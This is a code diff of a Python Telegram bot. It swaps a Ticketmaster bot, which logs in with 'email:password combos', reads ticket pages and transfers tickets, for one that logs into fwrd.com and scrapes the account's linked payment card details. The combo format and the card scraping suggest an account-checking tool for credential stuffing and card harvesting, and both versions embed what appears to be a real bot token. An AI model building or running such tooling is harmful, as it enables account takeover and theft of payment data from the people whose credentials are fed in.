@@ -1,82 +1,50 @@
-# Telegram Bot for Ticketmaster Account Management
-
-import telegram
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, Updater  # Added Updater import
 import requests
+from bs4 import BeautifulSoup
+from telegram import Update, Bot
+from telegram.ext import CommandHandler, CallbackContext, Updater
 
-TOKEN = '7297098002:AAGaCltHCKy-9PCZEiBDeyKW7nm4lw0oT6U'
-bot = telegram.Bot(token=TOKEN)
+# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token
+TELEGRAM_BOT_TOKEN = '7297098002:AAGaCltHCKy-9PCZEiBDeyKW7nm4lw0oT6U'
 
-# Store user session data
-user_sessions = {}
+def start(update: Update, context: CallbackContext) -> None:
+    update.message.reply_text('Welcome! Please provide your email and password in the format: /login email:password')
 
-def start(update, context):
-    update.message.reply_text('Welcome! Please send your email:password combo.')
+def login(update: Update, context: CallbackContext) -> None:
+    if len(context.args) != 1:
+        update.message.reply_text('Please provide your email and password in the format: email:password')
+        return
 
-def login(update, context):
-    user_id = update.message.from_user.id
-    credentials = update.message.text.split(':')
-    
-    if len(credentials) == 2:
-        email, password = credentials
-        # Simulate Ticketmaster login
-        session = requests.Session()
-        response = session.post('https://www.ticketmaster.com/login', data={'email': email, 'password': password})
-        
-        if response.ok:
-            user_sessions[user_id] = session
-            update.message.reply_text('Logged in successfully!')
-        else:
-            update.message.reply_text('Login failed. Please check your credentials.')
+    email, password = context.args[0].split(':')
+    session = requests.Session()
+
+    # Login to fwrd.com
+    login_url = 'https://www.fwrd.com/fw/mobile/Login.jsp'
+    payload = {
+        'email': email,
+        'password': password
+    }
+    session.post(login_url, data=payload)
+
+    # Check linked cards
+    billing_info_url = 'https://www.fwrd.com/fw/mobile/BillingInfo.jsp'
+    response = session.get(billing_info_url)
+    soup = BeautifulSoup(response.text, 'html.parser')
+
+    # Extract card information (this will depend on the actual HTML structure)
+    cards = soup.find_all('div', class_='card-info')  # Adjust class name as necessary
+    if cards:
+        card_info = '\n'.join([card.get_text() for card in cards])
+        update.message.reply_text(f'Linked Cards:\n{card_info}')
     else:
-        update.message.reply_text('Please send in the format email:password.')
+        update.message.reply_text('No linked cards found or login failed.')
 
-def check_tickets(update, context):
-    user_id = update.message.from_user.id
-    session = user_sessions.get(user_id)
-    
-    if session:
-        response = session.get('https://www.ticketmaster.com/my-tickets')
-        if response.ok:
-            update.message.reply_text('Here are your tickets: ' + response.text)
-        else:
-            update.message.reply_text('Failed to retrieve tickets.')
-    else:
-        update.message.reply_text('You are not logged in. Please log in first.')
+def main() -> None:
+    updater = Updater(TELEGRAM_BOT_TOKEN)
+    dispatcher = updater.dispatcher
 
-def logout(update, context):
-    user_id = update.message.from_user.id
-    if user_id in user_sessions:
-        del user_sessions[user_id]
-        update.message.reply_text('Logged out successfully.')
-    else:
-        update.message.reply_text('You are not logged in.')
+    dispatcher.add_handler(CommandHandler('start', start))
+    dispatcher.add_handler(CommandHandler('login', login))
 
-def transfer_tickets(update, context):
-    user_id = update.message.from_user.id
-    session = user_sessions.get(user_id)
-    
-    if session:
-        # Simulate ticket transfer
-        response = session.post('https://www.ticketmaster.com/transfer-tickets', data={'ticket_id': '12345', 'recipient_email': 'recipient@example.com'})
-        
-        if response.ok:
-            update.message.reply_text('Tickets transferred successfully!')
-        else:
-            update.message.reply_text('Failed to transfer tickets.')
-    else:
-        update.message.reply_text('You are not logged in. Please log in first.')
-
-def main():
-    updater = Updater(TOKEN, use_context=True)
-    dp = updater.dispatcher
-    
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, login))  # Updated filters usage
-    dp.add_handler(CommandHandler("check", check_tickets))
-    dp.add_handler(CommandHandler("logout", logout))
-    dp.add_handler(CommandHandler("transfer", transfer_tickets))
-    
     updater.start_polling()
     updater.idle()
 
